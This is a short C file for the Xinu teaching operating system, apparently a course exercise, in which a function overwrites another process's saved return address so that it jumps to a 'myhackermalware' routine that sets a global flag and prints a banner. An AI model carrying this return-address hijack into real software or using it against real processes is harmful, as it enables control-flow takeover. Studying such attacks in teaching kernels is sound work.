#include<xinu.h>

extern int victimglobal;

void  myhackermalware(void){
    victimglobal = 1;
    char *pattern = "***************************************";
    kprintf("\n%s\nFrom PID: %d\n victimglobal = %d\n%s\n", pattern, currpid, victimglobal, pattern);
    //while(1);
}

void myhacker(pid32 pid){
    struct procent * proc = &proctab[pid];
    unsigned long * fp, *ret;

    kprintf("\n\nmyhacker pid = %d\n", currpid);
    
    fp = (unsigned long *)proc->prstkptr;
    fp += 2;
    fp = (unsigned long *) *fp;
    ret = fp + 1;
    *ret = (unsigned long *) myhackermalware;
}
